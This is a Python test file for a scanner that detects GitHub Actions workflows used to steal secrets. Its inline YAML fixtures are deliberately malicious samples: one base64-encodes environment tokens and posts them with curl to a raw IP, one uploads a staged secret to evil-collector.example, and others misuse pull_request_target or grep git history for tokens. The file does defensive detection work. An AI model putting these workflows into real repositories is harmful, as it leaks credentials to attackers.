"""Tests for ghostaction-guard scan.py.

Port of the key test cases from Vibe-Code Audit's GhostAction Guard pack.
All fixtures are inline strings (deliberately-malicious DEMO constants,
never executed).
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import scan  # noqa: E402

# --- Fixtures ---------------------------------------------------------------

MALICIOUS = """\
name: Security Audit
on:
  schedule:
    - cron: '0 2 * * *'
jobs:
  audit:
    runs-on: ubuntu-latest
    env:
      AUDIT_TOKEN: ${{ secrets.DEPLOY_KEY }}
    steps:
      - uses: actions/checkout@v4
      - name: Run security audit
        run: |
          AUDIT=$(env | grep -i token | base64 -w0)
          curl -s -X POST https://185.22.14.9/collect -d "audit=$AUDIT&k=${{ secrets.DEPLOY_KEY }}"
"""

CLEAN_CI = """\
name: CI
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@49933ea5288caeca8642d1f5661110b583d0c
        with:
          node-version: 20
      - run: npm ci
      - run: npm test
"""

DECEPTIVE_NAME_BENIGN = """\
name: Security Scan
on:
  schedule:
    - cron: '0 6 * * 1'
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: npm audit --audit-level=high
      - run: echo "scan complete"
"""

SPLIT_STEP_EVIL = """\
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Prepare
        run: echo ${{ secrets.DEPLOY_KEY }} > /tmp/k
      - name: Upload report
        run: curl -s --data-binary @/tmp/k https://evil-collector.example/x
"""

PR_TARGET_EVIL = """\
name: PR Check
on: pull_request_target
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "validating ${{ secrets.CI_TOKEN }}"
"""

GIT_HISTORY_MINING = """\
name: Nightly hygiene
on:
  schedule:
    - cron: '0 3 * * *'
jobs:
  hygiene:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - run: git log -p | grep -Eo 'ghp_[A-Za-z0-9]{36}' | sort -u
"""

MALFORMED = "name: {{{{\n  broken: [unclosed\n\tbad indent\n"


# --- Helpers ----------------------------------------------------------------

def ids(findings):
    return sorted(f["pattern_id"] for f in findings)


# --- Tests ------------------------------------------------------------------

def test_malicious_fires_multiple_distinct_ga_findings():
    findings = scan.scan_text(MALICIOUS, "security-audit.yml")
    found = ids(findings)
    assert len(set(found)) >= 3, found
    assert "GA-001" in found  # deceptive filename + behavior
    assert "GA-002" in found  # secret -> external host, CRITICAL
    assert "GA-004" in found  # obfuscated endpoint (IP literal)
    assert "GA-005" in found  # env dump + base64


def test_malicious_critical_severity_and_location():
    findings = scan.scan_text(MALICIOUS, "security-audit.yml")
    ga002 = [f for f in findings if f["pattern_id"] == "GA-002"][0]
    assert ga002["severity"] == "CRITICAL"
    assert ga002["location"].startswith("security-audit.yml:")
    assert "campaign" in ga002 and ga002["campaign"]["name"] == "GhostAction"
    assert "walkthrough" in ga002


def test_clean_ci_stays_silent():
    assert scan.scan_text(CLEAN_CI, "ci.yml") == []


def test_deceptive_name_alone_never_fires():
    # Name alone is not a signal — benign behavior must stay silent.
    assert scan.scan_text(DECEPTIVE_NAME_BENIGN, "security-scan.yml") == []


def test_split_step_file_staging_fires_ga008():
    findings = scan.scan_text(SPLIT_STEP_EVIL, "ci.yml")
    found = ids(findings)
    assert "GA-008" in found, found


def test_pull_request_target_with_secrets_fires_ga003():
    findings = scan.scan_text(PR_TARGET_EVIL, "pr-check.yml")
    found = ids(findings)
    assert "GA-003" in found, found
    ga003 = [f for f in findings if f["pattern_id"] == "GA-003"][0]
    assert ga003["severity"] == "CRITICAL"


def test_git_history_mining_fires_ga007():
    findings = scan.scan_text(GIT_HISTORY_MINING, "hygiene.yml")
    assert "GA-007" in ids(findings)


def test_malformed_yaml_never_raises():
    assert scan.scan_text(MALFORMED, "broken.yml") == []
    assert scan.scan_text("", "empty.yml") == []
    assert scan.scan_text("   \n  \n", "blank.yml") == []


def test_deterministic():
    a = scan.scan_text(MALICIOUS, "security-audit.yml")
    b = scan.scan_text(MALICIOUS, "security-audit.yml")
    assert [f["pattern_id"] for f in a] == [f["pattern_id"] for f in b]


def test_no_unsafe_patterns_in_engine():
    src = open(os.path.join(os.path.dirname(__file__), "..", "scan.py")).read()
    for pat in ["eval(", "exec(", "os.system", "shell=True",
                "yaml.load", "pickle", "marshal", "__import__"]:
        assert pat not in src, pat


def test_cli_exit_codes(tmp_path):
    evil = tmp_path / "security-audit.yml"
    evil.write_text(MALICIOUS)
    clean = tmp_path / "ci.yml"
    clean.write_text(CLEAN_CI)
    assert scan.main([str(evil), "--fail-on", "high"]) == 1
    assert scan.main([str(clean), "--fail-on", "high"]) == 0
    assert scan.main([str(evil), "--fail-on", "never"]) == 0


def test_cli_json_output(tmp_path):
    import json
    evil = tmp_path / "security-audit.yml"
    evil.write_text(MALICIOUS)
    out = tmp_path / "report.json"
    assert scan.main([str(evil), "--format", "json",
                      "--output", str(out), "--fail-on", "never"]) == 0
    report = json.loads(out.read_text())
    assert report["engine"] == "ghostaction-guard"
    assert report["campaign"]["name"] == "GhostAction"
    assert len(report["results"][0]["findings"]) >= 3
